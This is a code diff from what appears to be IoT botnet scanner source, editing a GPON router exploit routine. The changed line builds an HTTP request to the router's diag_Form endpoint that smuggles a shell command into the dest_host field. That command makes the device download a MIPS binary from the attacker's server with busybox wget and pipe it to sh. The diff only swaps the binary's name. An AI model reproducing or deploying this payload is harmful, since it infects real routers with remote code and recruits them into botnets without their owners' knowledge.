@@ -188,7 +188,7 @@ void gpon8080_scanner_init(void)
 				if (conn->state == GPON8080_SC_EXPLOIT_STAGE2) {
 					struct in_addr ia; ia.s_addr = SERVIP;
 					snprintf(conn->payload_buf, sizeof(conn->payload_buf),
-						"POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://%s/bins/nullpointer.mips+-O+-+|+sh`&ipv=0",
+						"POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://%s/bins/fnbnet.mips+-O+-+|+sh`&ipv=0",
 						inet_ntoa(ia));
 					send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
 					util_zero(conn->payload_buf, sizeof(conn->payload_buf));
